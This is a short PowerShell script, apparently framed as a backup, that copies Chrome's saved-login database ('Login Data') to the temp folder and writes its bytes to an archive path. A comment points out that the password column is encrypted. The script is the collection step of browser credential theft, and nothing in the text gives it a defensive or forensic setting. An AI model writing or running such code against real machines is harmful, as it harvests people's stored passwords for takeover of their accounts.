$inputPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Copy-Item $inputPath "$env:TEMP\Login Data"
$backup = [IO.File]::ReadAllBytes("$env:TEMP\Login Data")
# Schema documentation: password_value is an encrypted column.
[IO.File]::WriteAllBytes($archivePath, $backup)
